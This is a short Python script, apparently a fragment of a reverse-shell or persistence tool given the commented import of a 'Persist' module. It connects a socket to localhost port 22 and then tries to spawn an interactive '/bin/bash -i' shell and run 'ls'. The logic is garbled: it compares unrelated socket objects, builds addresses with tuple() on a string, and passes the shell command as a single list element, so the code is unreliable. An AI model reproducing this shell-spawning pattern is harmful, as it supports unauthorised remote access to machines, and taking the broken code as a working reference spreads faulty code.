import socket
import subprocess
import os
import ipaddress
#from SwipeDown.SwipeDown.Persist import pingClient as pc
#

ip = str(ipaddress.ip_address('127.0.0.1'))
port = 22
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

try:
    if socket.SocketKind == socket.socket(proto=22):
        socket.create_connection(tuple(ip), timeout=300000, source_address=tuple('127.0.0.1'))
        p = subprocess.call(["/bin/bash -i"])
        command = os.system('ls')

    else:
        print(f'Not connected to {ip}')
except IOError as e:
    print(e)